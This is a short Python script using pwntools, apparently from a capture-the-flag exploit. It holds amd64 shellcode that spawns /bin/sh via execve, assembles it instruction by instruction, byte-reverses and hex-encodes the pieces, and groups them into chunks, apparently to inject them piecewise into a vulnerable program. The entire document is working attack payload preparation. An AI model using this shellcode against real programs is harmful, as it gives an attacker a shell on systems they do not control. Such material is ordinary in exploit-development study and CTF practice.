from pwn import *
context.arch = 'amd64'

shall='''push 0x68
    mov rax, 0x732f2f2f6e69622f
    push rax
    mov rdi, rsp
    push 0x1010101 ^ 0x6873
    xor dword ptr [rsp], 0x1010101
    xor esi, esi /* 0 */
    push rsi /* null terminate */
    push 8
    pop rsi
    add rsi, rsp
    push rsi /* 'sh\x00' */
    mov rsi, rsp
    xor edx, edx /* 0 */
    push SYS_execve /* 0x3b */
    pop rax
    syscall'''
shlist=shall.split('\n')
asmlist=[asm(i)[::-1].hex() for i in shlist]
print(asmlist)
p0=asmlist[0]
print(p0)
p1=asmlist[2]+asmlist[1]
print(p1)
p2=asmlist[4]+asmlist[3]
print(p2)
p3=asmlist[8]+asmlist[7]+asmlist[6]+asmlist[5]
print(p3)
p3=asmlist[11]+asmlist[10]+asmlist[9]
print(p3)
p3=asmlist[14]+asmlist[13]+asmlist[12]
print(p3)
p3=asmlist[16]+asmlist[15]
print(p3)